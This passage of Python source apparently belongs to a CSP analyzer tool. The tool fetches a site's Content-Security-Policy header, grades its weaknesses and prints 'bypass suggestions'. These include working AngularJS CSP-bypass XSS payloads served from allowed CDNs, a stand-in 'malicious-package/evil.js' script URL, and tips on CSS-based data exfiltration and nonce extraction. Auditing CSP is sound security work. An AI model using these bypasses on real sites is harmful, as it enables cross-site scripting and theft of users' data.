                "directive": "script-src",
                "issue": "'strict-dynamic' trusts scripts loaded by trusted scripts",
                "severity": "MEDIUM",
            })
            bypasses.append("If you can inject into a nonced script, dynamically added scripts will execute.")
            bypasses.append("Look for script gadgets in loaded libraries.")

        # --- Nonce present ---
        if has_nonce:
            weaknesses.append({
                "directive": "script-src",
                "issue": "Nonce-based policy — check for nonce reuse or leaking in responses",
                "severity": "LOW",
            })
            bypasses.append("Check if the nonce value is static (reused across requests).")
            bypasses.append("Check if the nonce appears in the page source (can be extracted).")

        # --- https: only in script-src ---
        if "https:" in script_src and "'unsafe-inline'" not in script_src:
            weaknesses.append({
                "directive": "script-src",
                "issue": "'https:' allows loading scripts from any HTTPS origin",
                "severity": "MEDIUM",
            })
            bypasses.append("Host a script on any HTTPS domain to bypass.")

        # --- Known bypass CDNs ---
        for cdn in self.BYPASS_CDNS:
            if cdn in all_values_flat:
                weaknesses.append({
                    "directive": "script-src",
                    "issue": f"Known bypass CDN allowed: {cdn}",
                    "severity": "HIGH",
                })
                if "cdnjs.cloudflare.com" == cdn:
                    bypasses.append(
                        f"Use Angular on {cdn}: "
                        "<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js'></script>"
                        "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>"
                    )
                elif "cdn.jsdelivr.net" == cdn:
                    bypasses.append(
                        f"Use jsdelivr to proxy any GitHub repo: "
                        "https://cdn.jsdelivr.net/gh/user/repo@version/file.js"
                    )
                elif "ajax.googleapis.com" == cdn:
                    bypasses.append(
                        f"Use Angular on {cdn}: "
                        "<script src='https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js'></script>"
                        "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>"
                    )
                elif "unpkg.com" == cdn:
                    bypasses.append(
                        f"Load arbitrary npm packages from {cdn}: "
                        "https://unpkg.com/malicious-package/evil.js"
                    )

        # --- report-uri / report-to ---
        if "report-uri" in directives or "report-to" in directives:
            weaknesses.append({
                "directive": "report-uri/report-to",
                "issue": "CSP reporting configured — violations are logged but may still be enforced",
                "severity": "LOW",
            })

        # --- unsafe-inline in style-src ---
        if "'unsafe-inline'" in style_src:
            weaknesses.append({
                "directive": "style-src",
                "issue": "'unsafe-inline' in style-src allows CSS injection",
                "severity": "LOW",
            })
            bypasses.append("CSS injection possible — use for data exfiltration via background-image URLs.")

        return weaknesses, bypasses

    def _calculate_risk(self, weaknesses: List[Dict]) -> str:
        """Calculate overall risk level from weaknesses."""
        if not weaknesses:
            return "LOW"
        severities = [w["severity"] for w in weaknesses]
        high_count = severities.count("HIGH")
        medium_count = severities.count("MEDIUM")
        if high_count >= 2:
            return "HIGH"
        if high_count == 1:
            return "HIGH"
        if medium_count >= 2:
            return "MEDIUM"
        if medium_count == 1:
            return "MEDIUM"
        return "LOW"

    # -- public interface --

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[CspAnalyzerTool] Error: Invalid JSON input. {exc}"

        url = data.get("url")
        csp_string = data.get("csp_string")
        timeout = data.get("timeout", 10)

        if not url and not csp_string:
            return "[CspAnalyzerTool] Error: Either 'url' or 'csp_string' is required."

        report_only_csp = None
        fetched_url = url

        # Fetch CSP from URL if no csp_string provided
        if not csp_string:
            if not isinstance(url, str):
                return "[CspAnalyzerTool] Error: 'url' must be a string."
            try:
                resp = self.session.get(url, timeout=timeout)
                csp_string = resp.headers.get("Content-Security-Policy", "")
                report_only_csp = resp.headers.get("Content-Security-Policy-Report-Only", "")
            except Exception as exc:
                return f"[CspAnalyzerTool] Error fetching URL: {exc}"
        else:
            fetched_url = "(provided directly)"

        # Check if CSP exists
        if not csp_string and not report_only_csp:
            lines = [
                "[CspAnalyzerTool] CSP Analysis",
                "=" * 50,
                f"URL: {fetched_url}",
                "",
                "NO CONTENT-SECURITY-POLICY HEADER FOUND",
                "",
                "Risk Level: NONE (no CSP = no CSP-based protection)",
                "",
                "Without a CSP header, there is no browser-level XSS mitigation.",
                "Standard XSS payloads should work if injection is possible.",
            ]
            return "\n".join(lines)

        # Parse and analyze
        lines = [
            "[CspAnalyzerTool] CSP Analysis",
            "=" * 50,
            f"URL: {fetched_url}",
            "",
        ]

        # Report-only check
        if report_only_csp and not csp_string:
            lines.append("!!! CSP IS REPORT-ONLY — NOT ENFORCED !!!")
            lines.append("The Content-Security-Policy-Report-Only header is set but")
            lines.append("no enforcing Content-Security-Policy header was found.")
            lines.append("XSS payloads should execute normally.")
            lines.append("")
            csp_string = report_only_csp
        elif report_only_csp:
            lines.append("NOTE: Content-Security-Policy-Report-Only header also present.")
            lines.append("")

        # Raw CSP
        lines.append("RAW CSP:")
        lines.append(f"  {csp_string}")
        lines.append("")

        # Parse directives
        directives = self._parse_csp(csp_string)

        lines.append("PARSED DIRECTIVES:")
        lines.append("-" * 40)
        for directive, values in directives.items():
            lines.append(f"  {directive}: {' '.join(values)}")
        lines.append("")

        # Analyze weaknesses
        weaknesses, bypasses = self._analyze_directives(directives)

        # Weaknesses
        lines.append(f"WEAKNESSES FOUND ({len(weaknesses)}):")
        lines.append("-" * 40)
        if weaknesses:
            for w in weaknesses:
                lines.append(f"  [{w['severity']}] {w['directive']}: {w['issue']}")
        else:
            lines.append("  No significant weaknesses detected.")
        lines.append("")

        # Bypass suggestions
        lines.append(f"BYPASS SUGGESTIONS ({len(bypasses)}):")
        lines.append("-" * 40)
        if bypasses:
            for i, bypass in enumerate(bypasses, start=1):
                lines.append(f"  {i}. {bypass}")
        else:
            lines.append("  No obvious bypasses found. CSP appears strong.")
        lines.append("")

        # Risk level
        risk = self._calculate_risk(weaknesses)
        lines.append(f"RISK LEVEL: {risk}")
        if risk == "HIGH":
            lines.append("  CSP has critical weaknesses that allow XSS bypass.")
        elif risk == "MEDIUM":
            lines.append("  CSP has weaknesses that may allow bypass with effort.")
        elif risk == "LOW":
            lines.append("  CSP is relatively strong but may have minor issues.")
        else:
            lines.append("  CSP provides no protection (not present).")

        return "\n".join(lines)
